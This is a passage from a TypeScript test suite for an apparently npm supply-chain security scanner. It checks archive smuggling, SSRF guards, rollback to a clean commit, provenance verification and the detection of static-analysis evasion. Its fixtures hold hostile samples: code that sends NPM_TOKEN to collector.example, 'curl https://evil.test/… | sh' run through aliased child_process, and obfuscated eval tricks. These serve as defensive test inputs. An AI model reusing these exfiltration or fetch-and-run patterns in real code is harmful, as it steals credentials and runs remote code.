    const eofRes = await unpackTarballInMemory(gzipSync(Buffer.concat([cleanRaw.subarray(0, cleanRaw.length - 512), evilRaw])), DEFAULT_POLICY);
    assert.equal(eofRes.ok, false);
    assert.ok(eofRes.observations.some((o) => o.code === "ARCHIVE_EOF_POLYGLOT_SMUGGLING"));

    const badPaxRes = await unpackTarballInMemory(buildPaxTar("not-a-valid-pax-record", "package/a.js", "ok", "x"), DEFAULT_POLICY);
    assert.equal(badPaxRes.ok, false);
    assert.ok(badPaxRes.observations.some((o) => o.code === "ARCHIVE_MALFORMED_PAX_HEADER"));

    const gnuKRes = await unpackTarballInMemory(buildSyntheticTgz([{ name: "package/longlink", content: "/etc/passwd", typeflag: "K" }]), DEFAULT_POLICY);
    assert.ok(gnuKRes.observations.some((o) => o.code === "ARCHIVE_UNSAFE_LINK_OR_DEVICE"));
    assert.equal(validateArchivePath("package/ind\u202eex.js").safe, false);

    // 4. IPv4-mapped IPv6 SSRF guards
    assert.equal(validateOutboundUrl("https://[::ffff:169.254.169.254]/latest/meta-data/").ok, false);
    assert.equal(validateOutboundUrl("https://[::ffff:127.0.0.1]/admin").ok, false);
    assert.equal(validateRemoteGitUrl("https://[::ffff:127.0.0.1]/org/repo.git").valid, false);
    assert.equal(validateRemoteGitUrl("https://[::ffff:169.254.169.254]/org/repo.git").valid, false);

    // 5. Fail-closed on skipped oversized file & OSV API unavailable
    const tinyPolicy = { ...DEFAULT_POLICY, max_single_file_bytes: 64 };
    const bigTgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "big-pkg", version: "1.0.0", license: "MIT" }) },
      { name: "package/bundle.js", content: "a".repeat(256) },
    ]);
    const bigUnpack = await unpackTarballInMemory(bigTgz, tinyPolicy);
    const bigTriage = triageUnpackedEntries(bigUnpack.entries, tinyPolicy);
    const bigReport = assembleInspectionReport({
      package_name: "big-pkg",
      version: "1.0.0",
      org_or_scope: "unscoped",
      creator: "dev",
      category_tags: [],
      summary: "ok",
      license: "MIT",
      bin_names: [],
      unpack: bigUnpack,
      triage: bigTriage,
      parity: { tier: "PROVENANCE_ATTESTED", provenance_attested: true, observations: [], unknowns: [] },
      advisories: [],
      registryObservations: [],
      registryUnknowns: ["OSV_API_UNAVAILABLE: HTTP 503"],
      policy: tinyPolicy,
      host_capabilities: DUMMY_CAPS,
      cwd: tmpdir(),
    });
    assert.equal(bigReport.verdict, "UNVERIFIABLE_UNKNOWN");

    // 6. KEV on HEAD + non-monotonic history detection + cross-file split payload in Git repo
    const tmpDir = mkdtempSync(join(tmpdir(), "coldpin-reg-"));
    try {
      const git = (a: string[]) => execFileSync("git", a, { cwd: tmpDir, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
      git(["init", "-b", "main"]);
      git(["config", "user.name", "T"]);
      git(["config", "user.email", "t@e.com"]);

      // C1: earlier infection (non-monotonic test)
      writeFileSync(join(tmpDir, "package.json"), JSON.stringify({ name: "nm-pkg", version: "1.0.0", license: "MIT" }));
      writeFileSync(join(tmpDir, "a.js"), "export const tok = process.env.NPM_TOKEN;\n");
      writeFileSync(join(tmpDir, "b.js"), 'import { tok } from "./a.js"; fetch("https://collector.example/x", { body: tok });\n');
      git(["add", "."]);
      git(["commit", "-m", "c1 infected"]);

      // C2: cleaned commit (v1.1.0)
      writeFileSync(join(tmpDir, "package.json"), JSON.stringify({ name: "nm-pkg", version: "1.1.0", license: "MIT" }));
      writeFileSync(join(tmpDir, "a.js"), "export const tok = 'clean';\n");
      writeFileSync(join(tmpDir, "b.js"), 'import { tok } from "./a.js"; console.log(tok);\n');
      git(["add", "."]);
      git(["commit", "-m", "c2 clean"]);
      const c2 = git(["rev-parse", "HEAD"]);

      // KEV on clean HEAD C2 MUST NOT emit USE_PINNED_LATEST
      const kevHead = await walkGitHistoryForCleanAnchor({
        package_name: "nm-pkg",
        repoUrlOrLocalPath: tmpDir,
        isLocalDir: true,
        policy: DEFAULT_POLICY,
        releaseTarballByCommit: new Map([[c2, { version: "1.1.0", tarball_sha512: "sha512-OK==", provenance_attested: true }]]),
        residualAdvisoriesByCommit: new Map([
          [c2, [{ id: "CVE-2026-11111", is_malicious: false, severity: "CRITICAL", kev: true, summary: "KEV RCE", package_name: "nm-pkg" }]],
        ]),
      });
      assert.equal(kevHead.recommended_action, "BLOCK_NO_SAFE_PATH");
      assert.equal(kevHead.safe_anchor?.pinned_execution.command, null);

      // C3: re-injected malware (non-monotonic history: C1 bad -> C2 clean -> C3 bad)
      writeFileSync(join(tmpDir, "a.js"), "export const tok = process.env.NPM_TOKEN;\n");
      writeFileSync(join(tmpDir, "b.js"), 'import { tok } from "./a.js"; fetch("https://collector.example/x", { body: tok });\n');
      git(["add", "."]);
      git(["commit", "-m", "c3 re-infected"]);

      const nonMono = await walkGitHistoryForCleanAnchor({
        package_name: "nm-pkg",
        repoUrlOrLocalPath: tmpDir,
        isLocalDir: true,
        policy: DEFAULT_POLICY,
        releaseTarballByCommit: new Map([[c2, { version: "1.1.0", tarball_sha512: "sha512-OK==", provenance_attested: true }]]),
      });
      assert.equal(nonMono.recommended_action, "ROLLBACK_TO_SAFE_ANCHOR");
      assert.ok(nonMono.unknowns.some((u) => u.startsWith("HISTORICAL_NON_MONOTONIC_COMPROMISE")));

      // 7. Yarn Berry (@npm:) & nested package-lock.json compromise detection
      const lockDir = join(tmpDir, "locks");
      mkdirSync(lockDir, { recursive: true });
      writeFileSync(join(lockDir, "yarn.lock"), '"other@^1.0.0", "@org/bad@npm:^1.0.0":\n  version: 1.4.2\n');
      const ybHit = checkLocalWorkspaceCompromised(lockDir, "@org/bad", "MALICIOUS_INDICATORS_FOUND");
      assert.equal(ybHit?.lockfile_kind, "yarn.lock");
      assert.equal(ybHit?.matched_version, "1.4.2");

      const npmNestedDir = join(tmpDir, "npm-nested");
      mkdirSync(npmNestedDir, { recursive: true });
      writeFileSync(
        join(npmNestedDir, "package-lock.json"),
        JSON.stringify({ packages: { "node_modules/parent/node_modules/nested-bad": { version: "9.9.9" } } }),
      );
      const npmHit = checkLocalWorkspaceCompromised(npmNestedDir, "nested-bad", "MALICIOUS_INDICATORS_FOUND");
      assert.equal(npmHit?.matched_version, "9.9.9");

      // 8. Audit log extra unhashed property injection detection
      const auditPath = join(tmpDir, "audit.jsonl");
      appendAuditEvent(auditPath, { action: "inspect", target: "ok", verdict: "VERIFIED_CLEAN_WITHIN_SCOPE", policy_sha256: "p", evidence_ids: [] });
      const rawLine = JSON.parse(readFileSync(auditPath, "utf8").trim()) as Record<string, unknown>;
      rawLine["injected_approval"] = "fake-ciso-signoff";
      writeFileSync(auditPath, `${JSON.stringify(rawLine)}\n`, "utf8");
      const verifyInjected = verifyAuditLog(auditPath);
      assert.equal(verifyInjected.valid, false);
      assert.ok(verifyInjected.reason?.includes("Unexpected unhashed field"));

      // 9. auditDependencyConfusion loads .npmrc from manifest directory & handles malformed JSON cleanly
      const extProj = join(tmpDir, "ext-proj");
      mkdirSync(extProj, { recursive: true });
      writeFileSync(join(extProj, ".npmrc"), "@acme:registry=https://artifactory.acme.internal/npm\n");
      writeFileSync(join(extProj, "package.json"), JSON.stringify({ name: "ext", dependencies: { "@acme/ok": "1.0.0" } }));
      const confOk = await auditDependencyConfusion({
        cwd: tmpdir(),
        manifestPath: join(extProj, "package.json"),
        policy: { ...DEFAULT_POLICY, private_scopes: ["@acme"] },
      });
      assert.equal(confOk.passed, true);

      const badManifest = join(extProj, "bad.json");
      writeFileSync(badManifest, "{ not valid json");
      const confBad = await auditDependencyConfusion({ cwd: tmpdir(), manifestPath: badManifest, policy: DEFAULT_POLICY });
      assert.equal(confBad.passed, false);
      assert.ok(confBad.unknowns.some((u) => u.startsWith("MANIFEST_PARSE_ERROR")));
    } finally {
      rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it("executes online CLI E2E against mocked npm registry + OSV HTTP servers (discover, inspect@ver, resolve-anchor --git-dir, boolean flag parsing)", async () => {
    const workDir = mkdtempSync(join(tmpdir(), "coldpin-e2e-http-"));
    const repoDir = join(workDir, "repo");
    const cacheDir = join(workDir, "cache");
    mkdirSync(repoDir, { recursive: true });

    const git = (a: string[]) => execFileSync("git", a, { cwd: repoDir, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
    git(["init", "-b", "main"]);
    git(["config", "user.name", "Rel"]);
    git(["config", "user.email", "rel@example.com"]);

    // Commit 1 (v1.0.0 clean)
    writeFileSync(join(repoDir, "package.json"), JSON.stringify({ name: "@demo/anchored", version: "1.0.0", license: "MIT", bin: { anchored: "./cli.js" } }));
    writeFileSync(join(repoDir, "cli.js"), "console.log('v1.0.0');\n");
    git(["add", "."]);
    git(["commit", "-m", "v1.0.0"]);
    const c1 = git(["rev-parse", "HEAD"]);

    // Commit 2 (v1.1.0 clean)
    writeFileSync(join(repoDir, "package.json"), JSON.stringify({ name: "@demo/anchored", version: "1.1.0", license: "MIT", bin: { anchored: "./cli.js" } }));
    writeFileSync(join(repoDir, "cli.js"), "console.log('v1.1.0');\n");
    git(["add", "."]);
    git(["commit", "-m", "v1.1.0"]);
    const c2 = git(["rev-parse", "HEAD"]);

    // Commit 3 (v2.0.0 clean in Git, but MAL-* tarball-only compromise in OSV!)
    writeFileSync(join(repoDir, "package.json"), JSON.stringify({ name: "@demo/anchored", version: "2.0.0", license: "MIT", bin: { anchored: "./cli.js" } }));
    git(["add", "."]);
    git(["commit", "-m", "v2.0.0"]);
    const c3 = git(["rev-parse", "HEAD"]);

    // Build real fresh-cli@1.0.0 tarball
    const freshTgz = buildSyntheticTgz([
      {
        name: "package/package.json",
        content: JSON.stringify({
          name: "fresh-cli",
          version: "1.0.0",
          license: "MIT",
          bin: { fresh: "./cli.js" },
          dependencies: { "dep-vuln": "2.0.0", chalk: "^5.0.0" },
        }),
      },
      { name: "package/cli.js", content: "console.log('fresh');\n" },
    ]);
    const freshSha = computeSha512Integrity(freshTgz);
    const twoHoursAgo = new Date(Date.now() - 2 * 3600 * 1000).toISOString();
    const yearAgo = new Date(Date.now() - 365 * 24 * 3600 * 1000).toISOString();

    let blockV110WithKev = false;

    const regSrv = createServer((req, res) => {
      const url = new URL(req.url ?? "/", "http://127.0.0.1");
      const base = `http://127.0.0.1:${(regSrv.address() as AddressInfo).port}`;
      if (url.pathname === "/-/v1/search") {
        const text = url.searchParams.get("text") ?? "";
        const objects = text.includes("formatter")
          ? [
              { package: { name: "@clean-alt/formatter", version: "3.2.1", license: "MIT", description: "Clean formatter alternative", date: yearAgo } },
            ]
          : [
              { package: { name: "good-fmt", version: "1.0.0", license: "MIT", description: "Clean formatter", date: yearAgo } },
              { package: { name: "agpl-fmt", version: "1.0.0", license: "AGPL-3.0", description: "Banned license formatter", date: yearAgo } },
              { package: { name: "mal-fmt", version: "1.0.0", license: "MIT", description: "Malicious package in OSV", date: yearAgo } },
            ];
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ objects }));
        return;
      }
      if (url.pathname === "/fresh-cli") {
        res.writeHead(200, { "content-type": "application/json" });
        res.end(
          JSON.stringify({
            name: "fresh-cli",
            "dist-tags": { latest: "1.0.0" },
            time: { created: twoHoursAgo, "1.0.0": twoHoursAgo },
            versions: {
              "1.0.0": {
                name: "fresh-cli",
                version: "1.0.0",
                license: "MIT",
                bin: { fresh: "./cli.js" },
                dependencies: { "dep-vuln": "2.0.0", chalk: "^5.0.0" },
                dist: { tarball: `${base}/tarballs/fresh-cli-1.0.0.tgz`, integrity: freshSha, attestations: { url: `${base}/att` } },
              },
            },
          }),
        );
        return;
      }
      if (url.pathname === "/tarballs/fresh-cli-1.0.0.tgz") {
        res.writeHead(200, { "content-type": "application/octet-stream", "content-length": String(freshTgz.length) });
        res.end(freshTgz);
        return;
      }
      if (url.pathname === "/@demo%2Fanchored") {
        res.writeHead(200, { "content-type": "application/json" });
        res.end(
          JSON.stringify({
            name: "@demo/anchored",
            "dist-tags": { latest: "2.0.0" },
            keywords: ["formatter"],
            time: { created: yearAgo, "1.0.0": yearAgo, "1.1.0": yearAgo, "2.0.0": yearAgo },
            versions: {
              ...(blockV110WithKev
                ? {}
                : {
                    "1.0.0": {
                      name: "@demo/anchored",
                      version: "1.0.0",
                      gitHead: c1,
                      dist: { tarball: `${base}/t1.tgz`, integrity: "sha512-V100==" },
                    },
                  }),
              "1.1.0": {
                name: "@demo/anchored",
                version: "1.1.0",
                gitHead: c2,
                bin: { anchored: "./cli.js" },
                dist: { tarball: `${base}/t11.tgz`, integrity: "sha512-V110==" },
              },
              "2.0.0": {
                name: "@demo/anchored",
                version: "2.0.0",
                gitHead: c3,
                bin: { anchored: "./cli.js" },
                keywords: ["formatter"],
                dist: { tarball: `${base}/t20.tgz`, integrity: "sha512-V200==" },
              },
            },
          }),
        );
        return;
      }
      res.writeHead(404);
      res.end();
    });

    const osvSrv = createServer(async (req, res) => {
      const url = new URL(req.url ?? "/", "http://127.0.0.1");
      if (req.method === "POST" && url.pathname === "/v1/querybatch") {
        const chunks: Buffer[] = [];
        for await (const ch of req) chunks.push(Buffer.from(ch));
        const body = JSON.parse(Buffer.concat(chunks).toString("utf8")) as {
          queries: Array<{ package: { name: string }; version?: string }>;
        };
        const results = body.queries.map((q) => {
          if (q.package.name === "mal-fmt") return { vulns: [{ id: "MAL-2026-9999" }] };
          if (q.package.name === "dep-vuln" && q.version === "2.0.0") return { vulns: [{ id: "GHSA-kev-2000" }] };
          if (q.package.name === "@demo/anchored" && q.version === "2.0.0") return { vulns: [{ id: "MAL-2026-8888" }] };
          if (blockV110WithKev && q.package.name === "@demo/anchored" && q.version === "1.1.0") {
            return { vulns: [{ id: "GHSA-kev-1100" }] };
          }
          return { vulns: [] };
        });
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ results }));
        return;
      }
      if (url.pathname.startsWith("/v1/vulns/")) {
        const vid = decodeURIComponent(url.pathname.slice("/v1/vulns/".length));
        const isKev = vid.includes("kev");
        res.writeHead(200, { "content-type": "application/json" });
        res.end(
          JSON.stringify({
            id: vid,
            summary: isKev ? "Known exploited critical bug" : "OpenSSF Malicious Package",
            database_specific: { severity: "CRITICAL", cisa_kev: isKev },
          }),
        );
        return;
      }
      res.writeHead(404);
      res.end();
    });

    await new Promise<void>((r) => regSrv.listen(0, "127.0.0.1", () => r()));
    await new Promise<void>((r) => osvSrv.listen(0, "127.0.0.1", () => r()));
    const regPort = (regSrv.address() as AddressInfo).port;
    const osvPort = (osvSrv.address() as AddressInfo).port;

    const policyPath = join(workDir, "policy.json");
    writeFileSync(
      policyPath,
      JSON.stringify({
        default_registry: `http://127.0.0.1:${regPort}`,
        osv_api_url: `http://127.0.0.1:${osvPort}`,
      }),
    );

    const cliPath = resolve("src/cli.ts");
    const runCli = (args: string[]) =>
      new Promise<{ code: number; stdout: string; stderr: string }>((res) => {
        const p = spawn(process.execPath, ["--no-warnings", cliPath, ...args]);
        let stdout = "";
        let stderr = "";
        p.stdout.on("data", (d) => (stdout += String(d)));
        p.stderr.on("data", (d) => (stderr += String(d)));
        p.on("close", (code) => res({ code: code ?? 1, stdout, stderr }));
      });

    try {
      // A. Online discover with boolean flag `--json` BEFORE positional query + license blocking + OSV MAL-* flagging
      const disc = await runCli(["discover", "--json", "fmt", "--policy", policyPath, "--cache-dir", cacheDir]);
      assert.equal(disc.code, 0, disc.stderr);
      const discJson = JSON.parse(disc.stdout) as {
        candidates: Array<{ package_name: string; verdict_preview: string }>;
        blocked_candidates: Array<{ package_name: string; reason: string }>;
      };
      assert.ok(discJson.blocked_candidates.some((b) => b.package_name === "agpl-fmt" && b.reason.includes("AGPL-3.0")));
      assert.equal(
        discJson.candidates.find((c) => c.package_name === "mal-fmt")?.verdict_preview,
        "MALICIOUS_INDICATORS_FOUND",
      );
      assert.ok(discJson.candidates.some((c) => c.package_name === "good-fmt"));

      // B. Online inspect <pkg>@<ver> with boolean `--json` BEFORE target -> cooldown + direct dep KEV + floating dep warning + honest unverified provenance
      const insp = await runCli(["inspect", "--json", "fresh-cli@1.0.0", "--policy", policyPath, "--cache-dir", cacheDir]);
      assert.equal(insp.code, 2, insp.stderr); // QUARANTINE_SUSPICIOUS (cooldown + KEV)
      const inspJson = JSON.parse(insp.stdout) as {
        verdict: string;
        info: { parity_tier: string; provenance_attested: boolean; provenance_status: string };
        evidence: Array<{ source: string; observations: Array<{ code: string }>; unknowns: string[]; coverage: { transitive_checked: boolean } }>;
      };
      assert.equal(inspJson.verdict, "QUARANTINE_SUSPICIOUS");
      assert.equal(inspJson.info.provenance_attested, false, "unverified dist.attestations.url must NEVER claim provenance_attested=true");
      assert.equal(inspJson.info.provenance_status, "metadata_url_only");
      assert.equal(inspJson.info.parity_tier, "PROVENANCE_METADATA_UNVERIFIED");
      const t0 = inspJson.evidence.find((e) => e.source === "tier0_intel")!;
      assert.ok(t0.observations.some((o) => o.code === "RELEASE_COOLDOWN_QUARANTINE"), "explicit @ver must still enforce cooldown");
      assert.ok(t0.observations.some((o) => o.code === "POLICY_CISA_KEV_BLOCK"), "direct dep KEV must fire");
      assert.equal(t0.coverage.transitive_checked, false);
      assert.ok(t0.unknowns.some((u) => u.startsWith("TRANSITIVE_FLOATING_RANGES_UNRESOLVED")));

      // Verify CycloneDX VEX attributes dep-vuln advisory to dep-vuln bom-ref (not root fresh-cli)
      const sbomRun = await runCli(["inspect", "--sbom", "fresh-cli@1.0.0", "--policy", policyPath, "--cache-dir", cacheDir]);
      const sbomJson = JSON.parse(sbomRun.stdout) as { vulnerabilities: Array<{ id: string; affects: Array<{ ref: string }> }> };
      assert.equal(sbomJson.vulnerabilities[0]?.affects[0]?.ref, "pkg:npm/dep-vuln@2.0.0");

      // C1. Online resolve-anchor <pkg> --git-dir <repo> -> MUST query packument + OSV MAL-* on v2.0.0 & roll back to v1.1.0!
      const anch1 = await runCli([
        "resolve-anchor",
        "--json",
        "@demo/anchored",
        "--git-dir",
        repoDir,
        "--policy",
        policyPath,
        "--cache-dir",
        cacheDir,
      ]);
      assert.equal(anch1.code, 0, anch1.stderr);
      const anch1Json = JSON.parse(anch1.stdout) as {
        recommended_action: string;
        safe_anchor?: { version?: string; commit_sha?: string; pinned_execution: { command: string | null } };
      };
      assert.equal(anch1Json.recommended_action, "ROLLBACK_TO_SAFE_ANCHOR");
      assert.equal(anch1Json.safe_anchor?.version, "1.1.0");
      assert.equal(anch1Json.safe_anchor?.commit_sha, c2);
      assert.ok(anch1Json.safe_anchor?.pinned_execution.command?.includes("@demo/anchored@1.1.0 -- anchored"));

      // C2. When v1.1.0 ALSO has a CISA KEV (and v1.0.0 unmapped), auto-discovers clean alternative outside @demo!
      blockV110WithKev = true;
      const cacheDir2 = join(workDir, "cache2");
      const anch2 = await runCli([
        "resolve-anchor",
        "--json",
        "@demo/anchored",
        "--git-dir",
        repoDir,
        "--policy",
        policyPath,
        "--cache-dir",
        cacheDir2,
      ]);
      assert.equal(anch2.code, 2, anch2.stderr); // SWITCH_TO_ALTERNATIVE
      const anch2Json = JSON.parse(anch2.stdout) as {
        recommended_action: string;
        alternatives: Array<{ package_name: string }>;
      };
      assert.equal(anch2Json.recommended_action, "SWITCH_TO_ALTERNATIVE");
      assert.ok(anch2Json.alternatives.some((a) => a.package_name === "@clean-alt/formatter"));

      // D. Unknown CLI flag & invalid --limit must exit 1 cleanly
      const badFlag = await runCli(["inspect", "--bogus-flag", "prettier"]);
      assert.equal(badFlag.code, 1);
      const badLimit = await runCli(["discover", "fmt", "--limit", "abc"]);
      assert.equal(badLimit.code, 1);
    } finally {
      regSrv.close();
      osvSrv.close();
      rmSync(workDir, { recursive: true, force: true });
    }
  });

  it("closes Round 2 static-triage evasion gaps (computed/data dynamic import, indirect/aliased/Reflect eval, aliased ESM/CJS sinks, multi-hop & cross-file wrappers, globalThis.process.env) with zero benign false positives", async () => {
    const evilTgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "round2-evasions", version: "1.0.0", license: "MIT" }) },
      { name: "package/dyn-import-expr.js", content: "export async function load(p) { return await import(p); }" },
      { name: "package/dyn-import-data.js", content: 'await import("data:text/javascript,console.log(1)");' },
      { name: "package/indirect-eval.js", content: '(0, eval)("1+1");' },
      { name: "package/array-join-eval.js", content: 'globalThis[["ev", "al"].join("")]("1+1");' },
      { name: "package/reflect-eval.js", content: 'const fn = Reflect.get(globalThis, "eval"); Reflect.apply(eval, null, ["1+1"]); Reflect.construct(Function, ["return 1"]); console.log(fn);' },
      { name: "package/aliased-eval.js", content: 'const runCode = eval; runCode("1+1");' },
      { name: "package/aliased-esm-cp.js", content: 'import { execSync as run } from "node:child_process"; run("curl https://evil.test/a.sh | sh");' },
      { name: "package/aliased-cjs-cp.js", content: 'const { execSync: run } = require("node:child_process"); run("curl https://evil.test/b.sh | sh");' },
      { name: "package/bracket-cp.js", content: 'import * as cp from "node:child_process"; cp["execSync"]("curl https://evil.test/c.sh | sh");' },
      { name: "package/aliased-https.js", content: 'import { get as exfil } from "node:https"; exfil(`https://collector.example/?t=${process.env.NPM_TOKEN}`);' },
      { name: "package/aliased-vm.js", content: 'import { runInNewContext as vmRun } from "node:vm"; vmRun("1+1");' },
      {
        name: "package/multihop-wrap.js",
        content: `
          function hop3(val) { return hop2(val); }
          function hop2(v) { const encoded = Buffer.from(v).toString("base64"); return hop1(encoded); }
          const hop1 = (x) => fetch("https://collector.example/m", { method: "POST", body: x });
          hop3(process.env.NPM_TOKEN);
        `,
      },
      {
        name: "package/global-proc-env.js",
        content: 'fetch("https://collector.example/g", { method: "POST", body: globalThis.process.env.NPM_TOKEN });',
      },
      { name: "package/sink-mod.js", content: 'export function report(x) { return fetch("https://collector.example/s", { method: "POST", body: x }); }' },
      { name: "package/caller-mod.js", content: 'import { report } from "./sink-mod.js"; report(process.env.NPM_TOKEN);' },
    ]);

    const evilUnpack = await unpackTarballInMemory(evilTgz, DEFAULT_POLICY);
    const evilTriage = triageUnpackedEntries(evilUnpack.entries, DEFAULT_POLICY);
    const byFile = (f: string) => new Set(evilTriage.observations.filter((o) => o.path === f).map((o) => o.code));

    assert.ok(byFile("dyn-import-expr.js").has("OBFUSCATED_DYNAMIC_EXEC"), "computed import(p) must be flagged");
    assert.ok(byFile("dyn-import-data.js").has("OBFUSCATED_DYNAMIC_EXEC"), "data: dynamic import must be flagged");
    assert.ok(byFile("indirect-eval.js").has("OBFUSCATED_DYNAMIC_EXEC"), "indirect (0, eval) must be flagged");
    assert.ok(byFile("array-join-eval.js").has("OBFUSCATED_DYNAMIC_EXEC"), "array.join('') computed eval must be flagged");
    assert.ok(byFile("reflect-eval.js").has("OBFUSCATED_DYNAMIC_EXEC"), "Reflect.get/apply/construct eval must be flagged");
    assert.ok(byFile("aliased-eval.js").has("OBFUSCATED_DYNAMIC_EXEC"), "aliased eval invocation must be flagged");
    assert.ok(byFile("aliased-esm-cp.js").has("CHILD_PROCESS_DANGEROUS_EXEC"), "aliased ESM child_process must be flagged");
    assert.ok(byFile("aliased-cjs-cp.js").has("CHILD_PROCESS_DANGEROUS_EXEC"), "aliased CJS child_process must be flagged");
    assert.ok(byFile("bracket-cp.js").has("CHILD_PROCESS_DANGEROUS_EXEC"), "cp['execSync'] must be flagged");
    assert.ok(byFile("aliased-https.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "aliased https.get exfil must be flagged");
    assert.ok(byFile("aliased-vm.js").has("OBFUSCATED_DYNAMIC_EXEC"), "aliased vm.runInNewContext must be flagged");
    assert.ok(byFile("multihop-wrap.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "3-hop transforming wrapper must be flagged");
    assert.ok(byFile("global-proc-env.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "globalThis.process.env must be flagged");
    assert.ok(byFile("caller-mod.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "cross-file exported sink wrapper must be flagged");

    // Benign zero-FP controls: static import("./sub.js"), aliased git --version, clean 2-hop fetch helper
    const cleanTgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "clean-round2-cli", version: "1.0.0", license: "MIT" }) },
      { name: "package/sub.js", content: "export const ok = true;" },
      {
        name: "package/index.js",
        content: `
          import { execSync as runGit } from "node:child_process";
          const sub = await import("./sub.js");
          const ver = runGit("git --version", { encoding: "utf8" });
          const doFetch = (u) => fetch(u);
          const ping = (u) => doFetch(u);
          await ping("https://registry.npmjs.org/-/ping");
          console.log(sub.ok, ver);
        `,
      },
    ]);
    const cleanUnpack = await unpackTarballInMemory(cleanTgz, DEFAULT_POLICY);
    const cleanTriage = triageUnpackedEntries(cleanUnpack.entries, DEFAULT_POLICY);
    assert.equal(cleanTriage.observations.length, 0, `Unexpected benign FPs: ${JSON.stringify(cleanTriage.observations)}`);
  });

  it("enforces npm provenance epistemic rigor (distinguishes unverified URL metadata and unanchored leaf DSSE from Sigstore trust-root verification, and blocks tampered SLSA digests/signatures)", async () => {
    const cleanTgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "prov-cli", version: "1.2.3", license: "MIT", bin: { prov: "./cli.js" } }) },
      { name: "package/cli.js", content: "console.log('prov-ok');\n" },
    ]);
    const sha512 = computeSha512Integrity(cleanTgz);
    const unpack = await unpackTarballInMemory(cleanTgz, DEFAULT_POLICY, sha512);
    const triage = triageUnpackedEntries(unpack.entries, DEFAULT_POLICY);
    const strictPolicy = { ...DEFAULT_POLICY, require_provenance: true };

    // 1. Unverified dist.attestations.url presence alone -> PROVENANCE_METADATA_UNVERIFIED, provenance_attested=false, fails strict require_provenance
    const metaOnlyParity = await verifyTarballVsGitParity({
      tarballManifest: triage.manifest,
      tarballEntries: unpack.entries,
      provenanceAttested: false,
      provenanceStatus: "metadata_url_only",
      provenanceUrl: "https://registry.npmjs.org/-/npm/v1/attestations/prov-cli@1.2.3",
    });
    assert.equal(metaOnlyParity.tier, "PROVENANCE_METADATA_UNVERIFIED");
    assert.equal(metaOnlyParity.provenance_attested, false);
    assert.ok(metaOnlyParity.unknowns.some((u) => u.startsWith("PROVENANCE_CRYPTO_UNVERIFIED")));
    const strictMetaReport = assembleInspectionReport({
      package_name: "prov-cli",
      version: "1.2.3",
      org_or_scope: "unscoped",
      creator: "dev",
      category_tags: [],
      summary: "ok",
      license: "MIT",
      bin_names: ["prov"],
      unpack,
      triage,
      parity: metaOnlyParity,
      advisories: [],
      registryObservations: [],
      registryUnknowns: [],
      policy: strictPolicy,
      host_capabilities: DUMMY_CAPS,
      cwd: tmpdir(),
    });
    assert.equal(strictMetaReport.verdict, "UNVERIFIABLE_UNKNOWN");
    assert.equal(strictMetaReport.info.provenance_attested, false);
    assert.equal(strictMetaReport.info.provenance_status, "metadata_url_only");

    // 2. Valid ECDSA leaf-signed DSSE SLSA bundle with matching tarball SHA-512 -> dsse_leaf_verified_unanchored, STILL provenance_attested=false (honest Fulcio/Rekor boundary!)
    const validAtt = buildTestNpmSlsaAttestation({ packageName: "prov-cli", version: "1.2.3", tarballSha512Sri: sha512 });
    const leafInsp = verifyNpmAttestationPayload(validAtt, sha512, "prov-cli", "https://registry.npmjs.org/att");
    assert.equal(leafInsp.status, "dsse_leaf_verified_unanchored");
    assert.equal(leafInsp.provenance_attested, false);
    assert.equal(leafInsp.observations.length, 0);
    assert.ok(leafInsp.unknowns.some((u) => u.startsWith("PROVENANCE_TRUST_ROOT_UNVERIFIED")));

    const leafParity = await verifyTarballVsGitParity({
      tarballManifest: triage.manifest,
      tarballEntries: unpack.entries,
      provenanceAttested: false,
      provenanceInspection: leafInsp,
    });
    assert.equal(leafParity.tier, "PROVENANCE_UNANCHORED_DSSE");
    assert.equal(leafParity.provenance_attested, false);

    // Under require_provenance=true, unanchored leaf DSSE STILL fails closed (UNVERIFIABLE_UNKNOWN)!
    const strictLeafReport = assembleInspectionReport({
      package_name: "prov-cli",
      version: "1.2.3",
      org_or_scope: "unscoped",
      creator: "dev",
      category_tags: [],
      summary: "ok",
      license: "MIT",
      bin_names: ["prov"],
      unpack,
      triage,
      parity: leafParity,
      advisories: [],
      registryObservations: [],
      registryUnknowns: [],
      policy: strictPolicy,
      host_capabilities: DUMMY_CAPS,
      cwd: tmpdir(),
    });
    assert.equal(strictLeafReport.verdict, "UNVERIFIABLE_UNKNOWN");
    const sbomLeaf = formatCycloneDxSbom(strictLeafReport) as {
      metadata: { component: { properties: Array<{ name: string; value: string }> } };
    };
    assert.ok(
      sbomLeaf.metadata.component.properties.some(
        (p) => p.name === "coldpin:provenance-status" && p.value === "dsse_leaf_verified_unanchored",
      ),
    );

    // 3. Tampered SLSA subject SHA-512 -> CRITICAL PROVENANCE_DIGEST_MISMATCH -> MALICIOUS_INDICATORS_FOUND
    const badDigestAtt = buildTestNpmSlsaAttestation({
      packageName: "prov-cli",
      version: "1.2.3",
      tarballSha512Sri: sha512,
      tamperDigest: true,
    });
    const badDigestInsp = verifyNpmAttestationPayload(badDigestAtt, sha512, "prov-cli");
    assert.equal(badDigestInsp.status, "verification_failed");
    assert.ok(badDigestInsp.observations.some((o) => o.code === "PROVENANCE_DIGEST_MISMATCH" && o.severity === "CRITICAL"));

    // 4. Tampered DSSE signature -> CRITICAL PROVENANCE_DSSE_SIGNATURE_INVALID -> MALICIOUS_INDICATORS_FOUND
    const badSigAtt = buildTestNpmSlsaAttestation({
      packageName: "prov-cli",
      version: "1.2.3",
      tarballSha512Sri: sha512,
      tamperSignature: true,
    });
    const badSigInsp = verifyNpmAttestationPayload(badSigAtt, sha512, "prov-cli");
    assert.equal(badSigInsp.status, "verification_failed");
    assert.ok(badSigInsp.observations.some((o) => o.code === "PROVENANCE_DSSE_SIGNATURE_INVALID" && o.severity === "CRITICAL"));

